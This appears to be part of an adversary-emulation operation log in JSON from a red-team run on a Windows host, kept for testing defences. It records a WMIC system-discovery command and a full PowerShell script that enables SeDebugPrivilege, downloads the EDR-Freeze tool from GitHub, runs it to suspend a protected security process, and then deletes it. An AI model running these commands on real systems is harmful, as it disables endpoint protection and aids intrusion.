+          "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
+          "executors": [
+            {
+              "name": "cmd",
+              "platform": "windows",
+              "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "discovery"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "atomic",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "cmd",
+          "platform": "windows",
+          "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:51:48Z"
+      },
+      {
+        "id": "1b436085-7ede-4e12-89e0-858ced033a6a",
+        "paw": "fgdafj",
+        "command": "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\"",
+        "plaintext_command": "",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-01T13:51:52Z",
+        "pin": 0,
+        "pid": "1584",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "1b436085-7ede-4e12-89e0-858ced033a6a",
+        "collect": "2026-04-01T13:52:39Z",
+        "finish": "2026-04-01T13:52:41Z",
+        "ability": {
+          "ability_id": "54ebf8b23105d20c98156afd96b97c81",
+          "tactic": "defense-evasion",
+          "technique_name": "Impair Defenses: Disable or Modify Tools",
+          "technique_id": "T1562.001",
+          "name": "Freeze PPL-protected process with EDR-Freeze",
+          "description": "This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes — such as those related to antivirus, credential protection, and system integrity — from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [
+                {
+                  "module": "plugins.atomic.app.parsers.atomic_powershell",
+                  "parserconfigs": [
+                    {
+                      "source": "validate_me",
+                      "edge": "",
+                      "target": "",
+                      "custom_parser_vals": {}
+                    }
+                  ]
+                }
+              ],
+              "cleanup": [
+                "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\""
+              ],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "defense-evasion"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "atomic",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |;     Sort-Object LastWriteTime -Descending |;     Select-Object -First 1 -ExpandProperty Name; if (-not $edrFreezeExeName) {;     Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red;     exit 1; }; $edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName; Write-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan; Write-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow; Start-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [
+            {
+              "module": "plugins.atomic.app.parsers.atomic_powershell",
+              "parserconfigs": [
+                {
+                  "source": "validate_me",
+                  "edge": "",
+                  "target": "",
+                  "custom_parser_vals": {}
+                }
+              ]
+            }
+          ],
+          "cleanup": [
+            "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue; Write-Output \"File deleted: $edrFreezeExe\""
+          ],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 1,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:52:40Z"
+      }
+    ],
+    "auto_close": true,
+    "visibility": 51,
+    "objective": {
+      "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+      "name": "default",
+      "description": "This is a default objective that runs forever.",
+      "goals": [
+        {
+          "target": "exhaustion",
+          "value": "complete",
+          "count": 1048576,
+          "operator": "==",
+          "achieved": false
+        }
+      ],
+      "percentage": 0.0
+    },
+    "use_learning_parsers": true,
+    "group": "red",
+    "source": {
+      "id": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "name": "basic",
+      "facts": [
+        {
+          "unique": "file.sensitive.extensionwav",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "wav",
+          "created": "2026-04-01T13:45:25Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "SEEDED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": null
+        },
+        {
+          "unique": "file.sensitive.extensionyml",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "yml",
+          "created": "2026-04-01T13:45:25Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "SEEDED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": null
+        },
+        {
+          "unique": "file.sensitive.extensionpng",
+          "trait": "file.sensitive.extension",
+          "name": "file.sensitive.extension",
+          "value": "png",
+          "created": "2026-04-01T13:45:25Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "SEEDED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": null
+        },
+        {
+          "unique": "server.malicious.urlkeyloggedsite.com",
+          "trait": "server.malicious.url",
+          "name": "server.malicious.url",
+          "value": "keyloggedsite.com",
+          "created": "2026-04-01T13:45:25Z",
+          "score": 1,
+          "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+          "origin_type": "SEEDED",
+          "links": [],
+          "relationships": [],
+          "limit_count": -1,
+          "collected_by": [],
+          "technique_id": null
+        }
+      ],
+      "rules": [
+        {
+          "action": "DENY",
+          "trait": "file.sensitive.extension",
+          "match": ".*"
+        },
+        {
+          "action": "ALLOW",
+          "trait": "file.sensitive.extension",
+          "match": "png"
+        },
+        {
+          "action": "ALLOW",
+          "trait": "file.sensitive.extension",
+          "match": "yml"
+        },
+        {
+          "action": "ALLOW",
+          "trait": "file.sensitive.extension",
+          "match": "wav"
+        }
+      ],
+      "adjustments": [],
+      "relationships": [],
+      "plugin": "stockpile"
+    }
+  },
+  "api_mode": "v2",
+  "poll_history": [
+    {
+      "ts": "2026-04-01T13:45:27Z",
+      "state": "running",
+      "links": 1,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:45:31Z",
+      "state": "running",
+      "links": 1,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:45:35Z",
+      "state": "running",
+      "links": 1,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:45:39Z",
+      "state": "running",
+      "links": 1,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:45:43Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:45:48Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:45:52Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:45:56Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:00Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:04Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:08Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:12Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:16Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:20Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:24Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:28Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:33Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:37Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:41Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:45Z",
+      "state": "running",
+      "links": 2,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:49Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:54Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:46:58Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:02Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:06Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:10Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:14Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:18Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:22Z",
+      "state": "running",
+      "links": 3,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:27Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:31Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:35Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:39Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:43Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:47Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:51Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:55Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:47:59Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:03Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:07Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:12Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:16Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:20Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:24Z",
+      "state": "running",
+      "links": 4,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:28Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:32Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:36Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:40Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:44Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:48Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:52Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:48:56Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:00Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:05Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:09Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:13Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:17Z",
+      "state": "running",
+      "links": 5,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:21Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:25Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:29Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:33Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:37Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:42Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:46Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:50Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:54Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:49:58Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:02Z",
+      "state": "running",
+      "links": 6,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:06Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:11Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:15Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:19Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:23Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:27Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:31Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:35Z",
+      "state": "running",
+      "links": 7,
+      "potential_links": 1118,
+      "event_logs": 0
+    },
+    {
+      "ts": "2026-04-01T13:50:40Z",
